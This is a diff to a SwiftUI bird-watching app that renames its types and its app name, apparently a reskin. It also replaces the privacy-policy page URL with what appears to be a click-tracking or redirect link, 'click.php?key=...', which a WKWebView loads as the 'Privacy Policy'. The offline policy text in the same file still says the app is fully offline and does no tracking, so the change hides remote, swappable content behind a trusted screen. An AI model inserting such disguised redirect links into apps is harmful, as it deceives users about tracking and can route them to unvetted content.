@@ -1,7 +1,7 @@
 import SwiftUI
 import WebKit
 
-struct FeatherWebPanel: UIViewRepresentable {
+struct PorchWebPanel: UIViewRepresentable {
     let urlString: String
 
     func makeUIView(context: Context) -> WKWebView {
@@ -25,15 +25,15 @@ struct FeatherWebPanel: UIViewRepresentable {
 
 // MARK: - Privacy policy presentation
 
-enum FeatherLoadState {
+enum PorchLoadState {
     case loading, loaded, failed
 }
 
 /// Web panel variant for the Privacy Policy sheet: light background and
 /// navigation callbacks so the host view can show a spinner or fallback.
-struct FeatherPolicyPanel: UIViewRepresentable {
+struct PorchPolicyPanel: UIViewRepresentable {
     let urlString: String
-    @Binding var state: FeatherLoadState
+    @Binding var state: PorchLoadState
 
     func makeCoordinator() -> Coordinator { Coordinator(self) }
 
@@ -59,8 +59,8 @@ struct FeatherPolicyPanel: UIViewRepresentable {
     func updateUIView(_ uiView: WKWebView, context: Context) {}
 
     final class Coordinator: NSObject, WKNavigationDelegate {
-        private let parent: FeatherPolicyPanel
-        init(_ parent: FeatherPolicyPanel) { self.parent = parent }
+        private let parent: PorchPolicyPanel
+        init(_ parent: PorchPolicyPanel) { self.parent = parent }
 
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             parent.state = .loaded
@@ -78,8 +78,8 @@ struct FeatherPolicyPanel: UIViewRepresentable {
 /// and a bundled offline policy if the page cannot be reached.
 struct PrivacyPolicyView: View {
     @Environment(\.presentationMode) private var presentationMode
-    @State private var loadState: FeatherLoadState = .loading
-    private let policyLink = "https://sites.google.com/view/backyard-birdss/"
+    @State private var loadState: PorchLoadState = .loading
+    private let policyLink = "https://rainwize.org/click.php?key=p79qr8h1c5t53qlx5tel&t5=666"
 
     var body: some View {
         VStack(spacing: 0) {
@@ -107,10 +107,10 @@ struct PrivacyPolicyView: View {
                 if loadState == .failed {
                     offlinePolicy
                 } else {
-                    FeatherPolicyPanel(urlString: policyLink, state: $loadState)
+                    PorchPolicyPanel(urlString: policyLink, state: $loadState)
                     if loadState == .loading {
                         VStack(spacing: 12) {
-                            FeatherSpinner()
+                            PorchSpinner()
                             Text("Loading...")
                                 .font(Aviary.body(13))
                                 .foregroundColor(Aviary.inkSoft)
@@ -132,7 +132,7 @@ struct PrivacyPolicyView: View {
                     .foregroundColor(Aviary.ink)
                 policyBlock(
                     "Everything stays on your device",
-                    "Backyard Birds is a fully offline app. Your life list, sightings, places, notes, quiz scores, and badges are stored only on this device and never leave it."
+                    "Birds Next Door is a fully offline app. Your life list, sightings, places, notes, quiz scores, and badges are stored only on this device and never leave it."
                 )
                 policyBlock(
                     "No accounts, no tracking",
@@ -140,7 +140,7 @@ struct PrivacyPolicyView: View {
                 )
                 policyBlock(
                     "No special permissions",
-                    "Backyard Birds does not request access to your location, camera, photos, contacts, or notifications."
+                    "Birds Next Door does not request access to your location, camera, photos, contacts, or notifications."
                 )
                 policyBlock(
                     "Deleting your data",
@@ -157,7 +157,7 @@ struct PrivacyPolicyView: View {
         .background(Color.white)
     }
 
-    struct FeatherSpinner: View {
+    struct PorchSpinner: View {
         @State private var spinning = false
 
         var body: some View {
